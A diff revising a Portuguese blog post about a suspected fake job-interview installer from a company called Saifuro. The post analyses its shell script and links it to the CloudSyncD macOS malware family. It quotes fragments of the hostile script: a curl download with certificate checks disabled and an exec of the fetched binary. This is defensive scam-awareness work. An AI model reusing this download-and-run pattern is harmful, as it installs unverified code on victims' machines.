@@ -14,7 +14,7 @@ O processo seletivo estava associado a uma empresa chamada Saifuro. O aplicativo
 
 Não executei o instalador. Primeiro, fui olhar o que ele queria fazer.
 
-Essa decisão levou à investigação de um script shell que baixava e imediatamente iniciava um executável para Mac. A análise estática, com auxílio de IA, encontrou fortes correspondências com uma família de malware já documentada, chamada CloudSyncD.
+Essa decisão levou à investigação de um script shell que, se executado, baixaria e iniciaria imediatamente um executável para Mac. Nem o instalador nem os executáveis baixados foram executados. A análise estática, com auxílio de IA, encontrou fortes correspondências com uma família de malware já documentada, chamada CloudSyncD.
 
 Vou contar o que aconteceu, o que me deixou desconfiado e o que as evidências de fato permitiram concluir.
 
@@ -72,7 +72,7 @@ A resposta justificava o uso do aplicativo como uma forma de evitar respostas ge
   <figcaption>Conversa no dia da entrevista, após eu apontar problemas no instalador e pedir outra plataforma.</figcaption>
 </figure>
 
-O momento em que o download chegou fez diferença para mim. Quando uma reunião está prestes a começar, existe uma pressão para fazer o aplicativo funcionar e não se atrasar. Esse é um péssimo momento para decidir se vale a pena executar um software desconhecido.
+O momento em que o link para download chegou fez diferença para mim. Quando uma reunião está prestes a começar, existe uma pressão para fazer o aplicativo funcionar e não se atrasar. Esse é um péssimo momento para decidir se vale a pena executar um software desconhecido.
 
 ## Por trás da aparência profissional
 
@@ -112,7 +112,7 @@ O script tinha vários problemas concretos.
 
 ### Ele desativava a verificação de certificados
 
-O comando que baixava o payload incluía:
+O comando de download do payload incluía:
 
 ```bash
 curl -fsSLk -o "${_sys_dest_6vm}" "${_app_url_dyau}" </dev/null
@@ -124,25 +124,25 @@ Essa opção, sozinha, não comprovaria a presença de malware. Era uma parte da
 
 ### A função de verificação de assinatura nunca era chamada
 
-O script definia uma função de verificação de assinatura GPG, mas o fluxo de instalação efetivamente executado nunca a chamava. Não havia conferência de um checksum esperado nem verificação da identidade do distribuidor antes da execução.
+O script definia uma função de verificação de assinatura GPG, mas não havia nenhuma chamada a ela no código responsável pela instalação. Esse código também não continha uma conferência de checksum esperado nem uma verificação da identidade do distribuidor antes de iniciar o executável.
 
 Uma função de verificação em outro trecho do script não verifica o arquivo que está sendo instalado.
 
 ### A barra de progresso era controlada por um temporizador
 
-O progresso de instalação exibido avançava por meio de um laço com pequenas pausas. Ele não media o andamento do download nem da extração.
+O código da barra de progresso usava um loop com pequenas pausas para avançar o progresso exibido, em vez de acompanhar o download ou a extração.
 
-Uma barra de progresso decorativa também pode existir em um software legítimo. Nesse caso, ela aumentava as dúvidas sobre o que o instalador apresentava ao usuário.
+Uma barra de progresso decorativa também pode existir em um software legítimo. Nesse caso, a implementação aumentava as dúvidas sobre o que o instalador apresentaria ao usuário.
 
 ### Ele iniciava imediatamente um executável encontrado
 
-Depois de baixar e extrair o arquivo, o script procurava um executável e o passava para:
+Se fosse executado, o script baixaria e extrairia o arquivo, procuraria um executável e o iniciaria com:
 
 ```bash
 exec "${__bin_bin_sy}"
 ```
 
-Não havia uma pausa para inspecionar o programa baixado ou confirmar quem o distribuía. Executar o instalador entregaria o controle diretamente a esse programa.
+O fluxo de instalação não previa uma pausa para inspecionar o programa baixado ou confirmar quem o distribuía. Executar o instalador entregaria o controle diretamente a esse programa.
 
 O arquivo compactado obtido durante a investigação continha um único arquivo chamado `installer`: um executável universal para macOS, compatível com Intel e Apple Silicon.
 
